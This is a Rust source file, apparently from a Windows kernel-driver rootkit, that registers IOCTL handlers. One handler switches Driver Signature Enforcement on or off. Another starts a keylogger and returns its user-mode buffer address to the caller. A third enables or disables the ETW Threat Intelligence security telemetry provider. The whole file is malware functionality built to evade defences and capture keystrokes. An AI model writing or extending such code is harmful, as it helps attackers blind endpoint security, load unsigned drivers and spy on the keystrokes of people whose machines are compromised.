use {
    alloc::boxed::Box, 
    hashbrown::HashMap,
    super::keylogger::{get_user_address_keylogger, USER_ADDRESS},
    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS, STATUS_UNSUCCESSFUL},
    crate::{handle, misc::{dse::Dse, etwti::Etw}, utils::ioctls::IoctlHandler}, 
    shared::{
        ioctls::{IOCTL_ENABLE_DSE, IOCTL_ETWTI, IOCTL_KEYLOGGER}, 
        structs::{DSE, ETWTI}
    }, 
};

/// Registers the IOCTL handlers for misc-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Parameters
/// 
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the misc-related
///   IOCTL handlers will be inserted.
///
pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Responsible for enabling/disabling DSE.
    ioctls.insert(IOCTL_ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Dse::set_dse_state, DSE) };
        unsafe { (*irp).IoStatus.Information = 0 };
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

    // Start Keylogger
    ioctls.insert(IOCTL_KEYLOGGER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            if USER_ADDRESS == 0 {
                USER_ADDRESS = match get_user_address_keylogger()  {
                    Some(addr) => addr as usize,
                    None => return STATUS_UNSUCCESSFUL,
                };
            }
    
            let output_buffer = (*irp).AssociatedIrp.SystemBuffer;
            if !output_buffer.is_null() {
                *(output_buffer as *mut usize) = USER_ADDRESS;
            }
    
            (*irp).IoStatus.Information = core::mem::size_of::<usize>() as u64;
        }

        STATUS_SUCCESS
    }) as IoctlHandler);

    // Responsible for enabling/disabling ETWTI.
    ioctls.insert(IOCTL_ETWTI, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, Etw::etwti_enable_disable, ETWTI) };
        unsafe { (*irp).IoStatus.Information = 0 };

        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);
}